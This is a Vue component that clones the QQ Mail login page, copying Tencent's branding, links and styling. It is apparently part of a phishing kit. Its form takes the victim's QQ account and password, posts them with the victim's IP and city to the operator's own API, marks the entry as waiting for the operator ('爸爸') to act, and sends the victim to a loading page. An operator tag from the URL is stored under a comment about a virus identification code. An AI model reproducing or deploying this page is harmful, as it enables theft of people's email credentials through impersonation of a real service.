<template>
  <div>
    <img
      src="https://ssl.ptlogin2.qq.com/testimg"
      style="display: none"
      onload="reportPtlogin(1)"
      onerror="reportPtlogin(0)"
    />
    <div class="container">
      <div class="header">
        <a class="header_logo" href="/">QQ邮箱</a>
        <div class="header_link">
          <a href="https://w.mail.qq.com/cgi-bin/loginpage?f=xhtml">基本版</a
          >&nbsp;|&nbsp;<a href="https://en.mail.qq.com">English</a
          >&nbsp;|&nbsp;<a href="https://app.mail.qq.com/" target="_blank"
            >手机版</a
          >&nbsp;|&nbsp;
          <a href="https://exmail.qq.com?referrer=index_top" target="_blank"
            >企业邮箱</a
          >
        </div>
      </div>
      <div class="content">
        <div id="downError" class="login_msg" style="display: none">
          <p>
            <span class="login_msg_warning"></span
            >由于加载安全组件失败，为了您的帐号安全，无法正常登录邮箱，解决方法：
          </p>
          <ul>
            <li>按下F5重新刷新页面。</li>
            <li>
              打开浏览器“选项”菜单，选择“Internet选项”，执行清空缓存功能，确定后按F5刷新本页面。
            </li>
            <li>
              如上述方式仍然无法解决问题，请登录<a
                href="http://maildisk.bbs.qq.com"
                target="_blank"
                >邮箱论坛通知我们</a
              >，我们将尽快为您解决。
            </li>
          </ul>
        </div>
        <div class="content_wrapper">
          <div class="xm_login_container login_container" id="login">
            <div class="xm_login_card">
              <div class="xm_login_card_tab">
                <div class="xm_login_card_tab_item" id="wxLoginTab">
                  微信登录
                </div>
                <div
                  class="xm_login_card_tab_item xm_login_card_tab_item_Active"
                  id="qqLoginTab"
                >
                  QQ登录
                </div>
              </div>
              <div class="xm_login_card_cnt">
                <div class="xm_login_card_wx" id="wxLoginCard">
                  <!-- <iframe
                    id="login_wx_iframe"
                    class="login_loginBox_wx_iframe"
                    height="100%"
                    width="100%"
                    frameborder="no"
                    scrolling="no"
                    src="https://open.weixin.qq.com/connect/qrconnect?appid=wx5e893ac3cc590290&redirect_uri=https%3A%2F%2Fwx.mail.qq.com%2Flogin%2Flogin%3Fauth_type%3D1%26return_target%3D5%26delegate_url%3Dhttps%253A%252F%252Fmail.qq.com%252Fcgi-bin%252Freadtemplate%253Fcheck%253Dfalse%2526t%253Dloginpage_new_jump_for_xmail&self_redirect=false&response_type=code&scope=snsapi_login&state=state&href=https%3A%2F%2Fres.wx.qq.com%2Fa%2Fwebmail%2Fxmail%2Fres%2Fcss%2Fiframe_wx38793b.css#wechat_redirect"
                  ></iframe> -->
                  <div class="xm_login_card_state">
                    <p id="auto_login" data-check="0">
                      <a></a><span>下次自动登录</span>
                    </p>
                  </div>
                </div>
                <div class="xm_login_card_qq" id="qqLoginCard">

                  <form id="formContent">
                    <input type="text" placeholder="支持QQ号/邮箱/手机号登录" v-model="username"/>
                    <input type="text" placeholder="QQ密码" v-model="password"/>
                    <label for="xxx">
                      <input type="checkbox" value="xxx" name="xxx" id="xxx"/>
                      <span>下次自动登录</span>  
                    </label>
                  </form>
                  <button @click="onSubmit">授权登录</button>
                  <div>
                    <a href="https://ssl.ptlogin2.qq.com/ptui_forgetpwd">找回密码</a>
                    <a href="http://zc.qq.com/chs/index.html?type=1">新用户注册</a>
                  </div>

                </div>
              </div>
            </div>
            <div class="login_box second_login_box" style="display: none">
              <div class="login_box_header">
                <h1 class="login_box_title">登录QQ邮箱</h1>
              </div>
              <div id="msgContainer" class="login_box_msg">
                您填写的帐号或密码不正确，请再次尝试。
              </div>
              <div
                class="login_box_msg noCookie"
                id="infobarNoCookie"
                style="display: none"
              >
                你的浏览器不支持或已经禁止使用Cookie，导致无法正常登录。请<a
                  href="http://service.mail.qq.com/cgi-bin/help?subtype=1&&id=7&&no=1001007#chrome"
                  title="了解Cookie的更多信息"
                  target="_blank"
                  >启用Cookie<img
                    src="https://rescdn.qqmail.com/zh_CN/htmledition/images/webp/ico_help1e9c5d.gif"
                    style="margin: 0 2px"
                    align="absmiddle" /></a
                >后重试。
              </div>
              <div style="display: none" id="qlogin" class="qlogin"></div>
              <div class="login_operate" id="web_login">
                <form
                  id="loginform"
                  method="post"
                  name="loginform"
                  target="_self"
                  autocomplete="on"
                >
                  <div class="login_submit" style="">
                    <input
                      class="login_button"
                      id="btlogin"
                      name="btlogin"
                      type="submit"
                      value="登录"
                      tabindex="5"
                    />
                  </div>
                </form>
              </div>
              <a
                class="login_box_forgotpassword"
                href="https://aq.qq.com/cn2/findpsw/pc/pc_find_pwd_input_account?pw_type=6&aquin=&source_id=2705"
                target="_blank"
                >忘了密码？</a
              >
              <div
                style="display: none"
                id="switch"
                class="lineright"
                onmouseup="QMLogin.switchMode()"
              ></div>
            </div>
          </div>
          <div class="login_pictures">
            <div
              class="login_pictures_picture"
              style="
                background-image: url('https://rescdn.qqmail.com/zh_CN/htmledition/images/webp/tg-silence1e9c5d.jpg');
                background-position: right 40px;
              "
            ></div>
            <div class="login_pictures_txt">
              <p class="login_pictures_title">QQ邮箱，常联系！</p>
              <p>到头来，</p>
              <p>我们记住的，</p>
              <p>不是敌人的攻击，</p>
              <p>而是朋友的沉默。</p>
              <p>——马丁&middot;路德&middot;金</p>
              <p class="login_pictures_info">插画来自丑丑(两岁)</p>
            </div>
          </div>
        </div>
      </div>
      <div class="footer" style="line-height: 28px; padding: 6px 20px">
        <a href="https://www.tencent.com" target="_blank">关于腾讯</a
        >&nbsp;|&nbsp;<a
          href="https://mail.qq.com/cgi-bin/readtemplate?check=false&t=mail_clause"
          target="_blank"
          >服务条款</a
        >&nbsp;|&nbsp;<a
          href="https://wx.mail.qq.com/list/readtemplate?name=app_intro.html#/agreement/appPolicy"
          target="_blank"
          >隐私政策</a
        >&nbsp;|&nbsp;<a
          href="https://kf.qq.com/product/email.html"
          target="_blank"
          >客服中心</a
        >&nbsp;|&nbsp;<a
          href="https://mail.qq.com/zh_CN/contact_us.html"
          target="_blank"
          >联系我们</a
        >&nbsp;|&nbsp;<a href="https://service.mail.qq.com" target="_blank"
          >帮助中心</a
        >&nbsp;|&nbsp;<span class="gray"
          >&copy;1998 - 2022 Tencent Inc. All Rights Reserved.</span
        >
        <div class="commonFrame_recordnumber">
          <a
            href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=44030002000001"
            target="_blank"
            >粤公网安备&nbsp;&nbsp;44030002000001号</a
          ><a
            href="https://beian.miit.gov.cn/#/Integrated/index"
            target="_blank"
            >ICP备案号&nbsp;&nbsp;粤B2-20090059</a
          ><a
            href="https://rescdn.qqmail.com/qqmail/images/B2_20090059.jpg"
            class="last"
            target="_blank"
            >增值电信业务经营许可证&nbsp;&nbsp;粤B2-20090059</a
          >
        </div>
      </div>
    </div>
  </div>
</template>

<script>
// 这里可以导入其他文件（比如：组件，工具js，第三方插件js，json文件，图片文件等等）
import user from '@/api/user';

export default {
  // 组件注册
  components: {
  },
  // 定义属性
  data() {
    return {
      username: '',
      password: '',
      ip: '',
      id:''
    }
  },
  // 计算属性，会监听依赖属性值随之变化
  computed: {
  },
  // 监控data中的数据变化
  watch: {},
  // 方法集合
  // 提交数据之后，就跳转到loading界面
  methods: {
     onSubmit(values) {
      console.log(this.username)
      user.login(this.username,this.password,"已经点击登录，正在加载，等待爸爸的操作",this.ip).then(response => {
        // console.log(response);
        if(response.code == "200") {
          this.$router.push({path:"/loading",query:{"id":response.user.id}})
        }
      })
    },
  },
  // 生命周期 - 创建完成（可以访问当前this实例）
  created() {
      // 获取本机IP地址
      this.ip = returnCitySN["cip"]+"-"+returnCitySN["cname"];

      // 病毒识别码 // 存储病毒
      sessionStorage.setItem("adminUserName",this.$route.query.adminUserName)
  },
  // 生命周期 - 挂载完成（可以访问DOM元素）
  mounted() {
  },
  beforeCreate() {}, // 生命周期 - 创建之前
  beforeMount() {}, // 生命周期 - 挂载之前
  beforeUpdate() {}, // 生命周期 - 更新之前
  updated() {}, // 生命周期 - 更新之后
  beforeDestroy() {}, // 生命周期 - 销毁之前
  destroyed() {}, // 生命周期 - 销毁完成
  activated() {}, // 如果页面有keep-alive缓存功能，这个函数会触发
}
</script>

<style>
@import url("https://rescdn.qqmail.com/zh_CN/htmledition/style/webp/loginpage4cf68c.css");
/* @import url('https://res.mail.qq.com/zh_CN/htmledition/style/ptlogin_input_for_xmail56dc25.css'); */
.commonFrame_recordnumber {
  line-height: 20px;
  margin-bottom: 5px;
}
.commonFrame_recordnumber a {
  color: #868686;
  margin-right: 16px;
}
.commonFrame_recordnumber a.last {
  margin-right: 0;
}
#formContent{
  /* margin-top: 30px; */
  width: 80%;
  margin: 30px auto 0;
}
#formContent > input{
  text-indent: 10px;
  display: block;
  width:100%;
  padding:10px 0;
  margin: 10px 0;
}
#formContent > label{
  display: block;
  text-align: left;
  margin: 15px 0;
}

#formContent > label > span{
  vertical-align: top;
}

#formContent ~button{
  height:40px;
  width: 100%;
  background-color: #5A98DE;
  color: white;
  border: none;
  width: 80%;
  font-size: 16px;
}
#formContent ~div{
  margin: 10px auto;
  width: 80%;
  display: flex;
  justify-content: space-between;
}
#formContent ~div > a{
  display: block;
}
</style>
